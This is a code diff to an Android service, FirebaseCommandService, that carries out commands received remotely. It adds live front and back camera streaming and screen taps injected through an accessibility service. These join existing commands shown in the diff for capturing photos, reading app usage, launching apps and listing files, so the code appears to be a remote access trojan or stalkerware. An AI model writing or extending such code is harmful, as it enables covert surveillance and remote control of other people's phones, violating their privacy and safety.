@@ -146,8 +146,20 @@ class FirebaseCommandService : Service() {
             "GET_APP_USAGE" -> getAppUsageStats()
             "CAPTURE_PHOTO" -> capturePhoto()
             "GET_DEVICE_INFO" -> getDetailedDeviceInfo()
+            "START_LIVE_CAMERA:FRONT" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, true) }
+            "START_LIVE_CAMERA:BACK" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, false) }
+            "STOP_LIVE_CAMERA" -> com.jonas.x24.CameraStreamManager.stopStreaming()
             else -> {
-                if (command.startsWith("LAUNCH_APP:")) {
+                if (command.startsWith("DISPATCH_GESTURE:CLICK:")) {
+                    val coords = command.removePrefix("DISPATCH_GESTURE:CLICK:").split(":")
+                    if (coords.size == 2) {
+                        val xPercent = coords[0].toFloatOrNull()
+                        val yPercent = coords[1].toFloatOrNull()
+                        if (xPercent != null && yPercent != null) {
+                            com.jonas.x24.services.x24AccessibilityService.instance?.clickPercentage(xPercent, yPercent)
+                        }
+                    }
+                } else if (command.startsWith("LAUNCH_APP:")) {
                     val pkgName = command.removePrefix("LAUNCH_APP:").trim()
                     launchApp(pkgName)
                 } else if (command.startsWith("LIST_FILES:")) {
